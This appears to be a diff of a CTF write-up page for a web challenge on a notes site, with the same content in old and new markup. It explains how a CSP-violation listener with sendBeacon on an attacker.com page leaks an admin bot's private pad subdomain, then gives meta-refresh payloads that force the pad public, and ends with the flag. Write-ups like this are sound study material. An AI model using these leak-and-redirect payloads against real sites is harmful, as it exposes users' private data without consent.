-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#ff79c6">if</span>(req.session.username <span style="color:#ff79c6">==</span> pad.username){
-        <span style="color:#ff79c6">if</span>(req.query.edit<span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#39;isPublic&#39;</span>){
-            pad.isPublic <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">!</span>pad.isPublic
-            <span style="color:#ff79c6">await</span> pad.save()
-            <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>id<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
-        }
-        <span style="color:#ff79c6">if</span>(req.query.edit<span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#39;isTemp&#39;</span>){
-            pad.createdAt <span style="color:#ff79c6">=</span> pad.createdAt <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">undefined</span> <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>()
-            <span style="color:#ff79c6">await</span> pad.save()
-            <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>id<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
-        }
-    }
-</code></pre></div><p>So we just have to make the admin send a get request using ?edit=isPublic to make the note public. But unfortunately, the session cookie is having <code>sameSite: 'strict'</code> . So doing a csrf to make the note public won&rsquo;t work.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>pad.isPublic <span style="color:#ff79c6">&amp;&amp;</span> req.session.username <span style="color:#ff79c6">!=</span> pad.username){
+</span></span><span style="display:flex;"><span>        req.flash(<span style="color:#f1fa8c">&#39;danger&#39;</span>, <span style="color:#f1fa8c">&#39;Not allowed to access this non-public päääd.&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>The code to make the note public is as follows.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(req.session.username <span style="color:#ff79c6">==</span> pad.username){
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span>(req.query.edit<span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#39;isPublic&#39;</span>){
+</span></span><span style="display:flex;"><span>            pad.isPublic <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">!</span>pad.isPublic
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">await</span> pad.save()
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>id<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span>(req.query.edit<span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#39;isTemp&#39;</span>){
+</span></span><span style="display:flex;"><span>            pad.createdAt <span style="color:#ff79c6">=</span> pad.createdAt <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">undefined</span> <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>()
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">await</span> pad.save()
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> res.redirect(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>id<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>process.env.DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>So we just have to make the admin send a get request using ?edit=isPublic to make the note public. But unfortunately, the session cookie is having <code>sameSite: 'strict'</code> . So doing a csrf to make the note public won&rsquo;t work.</p>
 <p>To overcome this we can run the bot twice, the first time to leak the unique_id and the next time with a pad that has a meta redirect to <code>unique_id.xn--pd-viaaa.space?edit=isPublic</code> to make the note public.</p>
 <h2 id="--final-payloads">🚀  Final Payloads</h2>
 <p><code>First pad</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#6272a4">&lt;!-- redirect to attacker site --&gt;</span>
-&lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">http-equiv</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;refresh&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1; url=https://attacker.com/attacker.html&#34;</span>&gt;
-</code></pre></div><p><code>https://attacker.com/attacker.html</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#ff79c6">html</span>&gt;
-&lt;<span style="color:#ff79c6">head</span>&gt;
-    &lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">charset</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span>&gt;
-    &lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewport&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
-    &lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">http-equiv</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Content-Security-Policy&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;frame-src &#39;self&#39; xn--pd-viaaa.space;&#34;</span>&gt;
-    &lt;<span style="color:#ff79c6">title</span>&gt;TEST&lt;/<span style="color:#ff79c6">title</span>&gt;
-&lt;/<span style="color:#ff79c6">head</span>&gt;
-
-&lt;<span style="color:#ff79c6">body</span>&gt;
-    &lt;<span style="color:#ff79c6">script</span>&gt;
-        <span style="color:#8be9fd;font-style:italic">document</span>.addEventListener(<span style="color:#f1fa8c">&#39;securitypolicyviolation&#39;</span>, <span style="color:#ff79c6">async</span> <span style="color:#8be9fd;font-style:italic">function</span> (event) {
-            console.log(event)
-            navigator.sendBeacon(location.href,event.blockedURI)
-
-        });      
-    &lt;/<span style="color:#ff79c6">script</span>&gt;
-    &lt;<span style="color:#ff79c6">iframe</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://päääd.space/p/latest&#34;</span>&gt;&lt;/<span style="color:#ff79c6">iframe</span>&gt;
-&lt;/<span style="color:#ff79c6">body</span>&gt;
-
-&lt;/<span style="color:#ff79c6">html</span>&gt;
-</code></pre></div><p><code>Second pad</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#6272a4">&lt;!-- to make pad public--&gt;</span>
-&lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">http-equiv</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;refresh&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1; url=unique_id.xn--pd-viaaa.space?edit=isPublic&#34;</span>&gt;
-</code></pre></div><h2 id="-flag">🚩 Flag</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#6272a4">&lt;!-- redirect to attacker site --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">http-equiv</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;refresh&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1; url=https://attacker.com/attacker.html&#34;</span>&gt;
+</span></span></code></pre></div><p><code>https://attacker.com/attacker.html</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">charset</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewport&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">http-equiv</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Content-Security-Policy&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;frame-src &#39;self&#39; xn--pd-viaaa.space;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">title</span>&gt;TEST&lt;/<span style="color:#ff79c6">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">head</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">script</span>&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">document</span>.addEventListener(<span style="color:#f1fa8c">&#39;securitypolicyviolation&#39;</span>, <span style="color:#ff79c6">async</span> <span style="color:#8be9fd;font-style:italic">function</span> (event) {
+</span></span><span style="display:flex;"><span>            console.log(event)
+</span></span><span style="display:flex;"><span>            navigator.sendBeacon(location.href,event.blockedURI)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        });      
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#ff79c6">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">iframe</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://päääd.space/p/latest&#34;</span>&gt;&lt;/<span style="color:#ff79c6">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">body</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">html</span>&gt;
+</span></span></code></pre></div><p><code>Second pad</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#6272a4">&lt;!-- to make pad public--&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">meta</span> <span style="color:#50fa7b">http-equiv</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;refresh&#34;</span> <span style="color:#50fa7b">content</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1; url=unique_id.xn--pd-viaaa.space?edit=isPublic&#34;</span>&gt;
+</span></span></code></pre></div><h2 id="-flag">🚩 Flag</h2>
 <p><code>flag{hmmmmmmmmmXDD} </code></p></div>
 </article>
 
